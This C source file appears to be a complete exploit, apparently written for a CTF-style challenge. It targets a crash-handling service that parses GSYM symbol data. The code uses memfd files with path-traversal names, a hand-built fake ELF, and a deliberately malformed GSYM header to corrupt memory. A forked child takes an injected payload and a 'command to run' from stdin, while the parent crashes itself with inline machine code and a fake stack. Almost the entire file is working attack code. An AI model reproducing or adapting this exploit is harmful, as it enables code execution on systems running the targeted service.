void _write(uint32_t fd, void* data, uint32_t size) {
    __syscall(1, fd, data, size);
}
void _read(uint32_t fd, void* data, uint32_t size) {
    __syscall(0, fd, data, size);
}

void print(char* s) {
    _write(1, s, strlen(s));
}

typedef struct SymHeader {
    uint32_t magic;
    uint16_t version;
    uint8_t  addr_off_size;
    uint8_t  pad;
    uint64_t base_address;
    uint32_t num_addrs;
    uint32_t strtab_offset;
    uint32_t strtab_size;
    uint8_t uuid[20];
} SymHeader;

struct CrashMessage {
    uint32_t command;
    uint32_t pid;
}


void rev_str(char* s, char* e) {
    while (s < e) {
        char t = *s;
        *s = *e;
        *e = t;
        s++;
        e--;
    }
}

void itoa(char* p, uint32_t i) {
    if (i == 0) {
        p[0] = '0';
        p[1] = 0;
        return;
    }
    char* s = p;
    while (i != 0) {
        p[0] = 0x30 + (i % 10);
        i /= 10;
        p++;
    }
    p[0] = 0;
    rev_str(s, p-1);
}
void itoh(char* p, uint64_t i) {
    if (i == 0) {
        p[0] = '0';
        p[1] = 0;
        return;
    }
    char* s = p;
    while (i != 0) {
        uint8_t v = i % 16;
        if (v < 10) {
            p[0] = '0' + v;
        } else {
            p[0] = 'a' + (v - 10);
        }
        i /= 16;
        p++;
    }
    p[0] = 0;
    rev_str(s, p-1);
}

void print_u32(uint32_t i) {
    char buf[32];
    itoa(buf, i);
    print(buf);
}
void label_u32(char* s, uint32_t i) {
    print(s);
    print_u32(i);
    print("\n");
}
void print_pointer(void* i) {
    char buf[32];
    itoh(buf, (uint64_t)i);
    print(buf);
}
void label_pointer(char* s, void* p) {
    print(s);
    print_pointer(p);
    print("\n");
}

void asm(void* c) {
    void(*fp)(void) = (void (*)(void))c;
    fp();
}
void asm_2(void* c, uint64_t a, uint64_t b) {
    void(*fp)(uint64_t, uint64_t) = (void (*)(uint64_t, uint64_t))c;
    fp(a,b);
}

void _strcpy(char* out, char* in) {
    while(1) {
        char c = *in;
        *out = c;

        if (c == 0)
            break;
        out++;
        in++;
    };
}

struct _timespec {
    uint64_t tv_sec; /* seconds */
    uint64_t tv_nsec; /* nanoseconds */
};

void _sleep(int s) {
    struct _timespec ts;
    uint64_t v = 0;
    ts.tv_sec = v;
    ts.tv_sec = s;
    ts.tv_nsec = 0;
    __syscall(35, &ts, NULL);
}

void pause() {
    char c;
    read(0, &c, 1); 
}

void exploit() {
    uint64_t stack_buf[32];
    memset(stack_buf, 0, 32);

    uint32_t pid = getpid();
    label_u32("Child pid: ", pid);

    // memfd_create
    int stack_fd = __syscall(319, "stack", 0);
    label_u32("Fake stack fd: ", stack_fd);

    _write(stack_fd, (char*)stack_buf, 32);

    uint64_t* stack = (uint64_t*)mmap(0, 0x1000, 7, MAP_SHARED, stack_fd, 0);
    label_pointer("Fake stack: ", stack);

    uint8_t* crash_buf = (uint8_t*)mmap(0, 0x1000, 7, MAP_PRIVATE|MAP_ANON, -1, 0);
    label_pointer("Crash buf: ", crash_buf);

    crash_buf[0] = 0x48;
    crash_buf[1] = 0xc7;
    crash_buf[2] = 0xc0;
    crash_buf[3] = 0x00;
    crash_buf[4] = 0x00;
    crash_buf[5] = 0x00;
    crash_buf[6] = 0x00;

    char buf[0x1000];
    //buf[0] = 0;
    _strcpy(buf, "/../../../../../proc/");
    char* buf_end = &buf[strlen(buf)];
    itoa(buf_end, pid);
    buf_end = &buf[strlen(buf)];
    _strcpy(buf_end, "/fd/8");

    int elf_fd = __syscall(319, buf, 0);
    label_u32("Fake elf fd: ", elf_fd);

    //print(buf);
    //print("\n");
    // mkdir
    __syscall(83, "./memfd:", 0777);

    memset(buf, 0, 0x1000);

    uint64_t elf_data[28];
    elf_data[0] = 0x00010102464c457f;
    elf_data[1] = 0x0000000000000000;
    elf_data[2] = 0x00000001003e0003;
    elf_data[3] = 0x0000000000001190;
    elf_data[4] = 0x0000000000000040;
    elf_data[5] = 0x0000000000000040;
    elf_data[6] = 0x0038004000000000;
    elf_data[7] = 0x000000030040000d;
    elf_data[8] = 0x0000000300000001;
    elf_data[9] = 0x0000000000000000;
    elf_data[10] = 0x0000000000000000;
    elf_data[11] = 0x00000000000000c0;
    elf_data[12] = 0x0000000000000020;
    elf_data[13] = 0x0000000000000000;
    elf_data[14] = 0x0000000000000001;
    elf_data[15] = 0x0000000000000000;
    elf_data[16] = 0x000000010000000b;
    elf_data[17] = 0x0000000000000002;
    elf_data[19] = 0x00000000000000e0;
    elf_data[20] = 0x0000000000000400;
    elf_data[21] = 0x0000000000000000;
    elf_data[22] = 0x0000000000000008;
    elf_data[23] = 0x0000000000000000;
    elf_data[24] = 0x7472747368732e00;
    elf_data[25] = 0x6d7973672e006261;
    elf_data[26] = 0x0000000000000000;
    elf_data[27] = 0x0000000000000000;


    _write(elf_fd, elf_data, sizeof(elf_data));

    uint8_t num_size = 2;
#define NUM_ADDRS 4
    size_t num = NUM_ADDRS;

    SymHeader gsym;
    memset(&gsym, 0, sizeof(gsym));
    gsym.magic = 0x4753594d;
    gsym.version = 1;
    gsym.addr_off_size = num_size;
    gsym.pad = 0x14;
    gsym.base_address = NULL;
    gsym.num_addrs = NUM_ADDRS;
    gsym.strtab_offset = 0;
    gsym.strtab_size = 0;

    _write(elf_fd, &gsym, sizeof(gsym));

    size_t data_off = sizeof(gsym);
#define dwrite(fd, p, l) { _write(fd, p, l); data_off += (l); }

    uint16_t offs[NUM_ADDRS];
    offs[0] = 0;
    offs[1] = 0x10;
    offs[2] = 0x20;
    offs[3] = 0x20;
    dwrite(elf_fd, offs, num * 2);

    uint32_t addrs[NUM_ADDRS];
    addrs[0] = data_off + (4*num);
    addrs[1] = data_off + (4*num) + 4*4;
    addrs[2] = data_off + (4*num);
    addrs[3] = data_off + (4*num);
    dwrite(elf_fd, addrs, num * 4);

    uint32_t u32 = 0;
#define dwrite32(i) { u32 = i; dwrite(elf_fd, &u32, sizeof(uint32_t)); }
    
    // function info 0
    dwrite32(0); // func size
      //dwrite32(0); // name offset
      //dwrite32(0xffdc9689); // name offset
    dwrite32(0x1f20); // name offset
    dwrite32(0); // type
    dwrite32(0); // length

    size_t size_hack_target = data_off;
    // function info 1
    dwrite32(0xf0); // func size
    dwrite32(1); // name offset
    dwrite32(1); // type
    dwrite32(0x100); // length
    
    // pad out rest of elf
    _write(elf_fd, buf, 0x1000);

    uint8_t* elf = (uint8_t*)mmap(0, 0x1000, 7, MAP_SHARED, elf_fd, 0);
    label_pointer("Fake Elf @ ", elf);

    // Setup inf loop
    stack[0] = (uint64_t)( ((void*)stack) + 16 );
    // Get leak
    stack[1] = (uint64_t)elf;

    // Inf loop
    stack[2] = (uint64_t)( ((void*)stack) + 16 );
    stack[3] = (uint64_t)crash_buf;

    // Trigger overwrite
    stack[4] = (uint64_t)( elf+0x10 );
    stack[5] = -1;

    print("[Press enter to continue]\n");
    pause();

    int child_pid = fork();


    if (child_pid == 0) {
        child_pid = getpid();
        label_u32("I am child pid ", child_pid);

        label_u32("Proc sleeping... ", child_pid);
        _sleep(10);
        label_u32("Proc awake! ", child_pid);

        size_t off = 0xe0 + size_hack_target;
        label_u32("Writing to elf offset ", off);
        elf[off] = 0;
        print("Please send hax...\n");
        _read(0, elf + off + 4*4, 0x100);

        print("Please send command to run...\n");
        _read(0, elf + 0x400, 0x100);

        print("Hacking...\n");
        print("Fixing stack...\n");
        stack[2] = (uint64_t)crash_buf;
        print("Done with fix...\n");
    } else {
        label_u32("I am parent pid ", pid);
        label_u32("Proc crashing! ", pid);

        

        // 0:  48 89 c5                mov    rbp,rax
        // 3:  ff e1                   jmp    rcx
        asm_2(
            //"\xcc\x48\x89\xC5\xFF\xE1",
            "\x48\x89\xC5\xFF\xE1",
            (uint64_t)stack,
            (uint64_t)crash_buf
        );
    }
    //asm("\xcc\xc3");
    print("Done\n");

}

int main() {
    print("Starting exploit shellcode\n");
    exploit();
}

